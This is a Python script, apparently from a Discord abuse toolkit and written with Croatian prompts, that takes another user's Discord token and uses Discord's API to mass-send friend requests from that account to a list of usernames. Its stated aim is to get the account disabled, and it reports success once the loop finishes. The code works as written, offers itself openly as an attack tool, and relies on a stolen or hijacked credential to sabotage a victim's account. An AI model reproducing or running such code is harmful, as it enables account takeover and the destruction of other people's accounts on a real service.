import requests
import os
from colorama import Fore
from util.plugins.commun import * 

setTitle("Inspect Account Disabler")
clear()
accountdisablertitle()

def disable():
    print(f"""{y}[{w}>{y}]{w} UPISI TOKEN ACC-a KOJEG ZELIS DISABLE""")
    usertoken = str(input(f"""{y}[{b}--->{y}]{b} TOKEN: """))
    headers = {'Authorization': usertoken, 'Content-Type': 'application/json'}
    res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
    print(f"\n{y}[{Fore.LIGHTRED_EX }!{y}]{w} KORISNICKI DETAILS: {res['username']}#{res['discriminator']} - ({res['id']})")
    input(f"{y}[{b}--->{y}]{w} AKO SU DETAILS TOCNI PRITISNI ENTER")
    print()
    for username in open('util/11_AccountDisabler/users.txt', 'r').read().splitlines():
        try:
            usr = username.split('#')
            r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
            print(f"\t{y}[{Fore.LIGHTRED_EX }!{y}]{w} {usr[0]}--->{usr[1]} DODANO!")
        except:
            print(f"{y}[{Fore.LIGHTRED_EX }!{y}]{b} NESTO JE KRIVO!")
    print(f"\n\n{y}[{Fore.LIGHTRED_EX }!{y}]{b} ACCOUNT JE USPJESNO UGASEN!")
    input(f"""\n{y}[{b}--->{y}]{b} PRITISNI ENTER DA IZADJES""")
    main()

disable()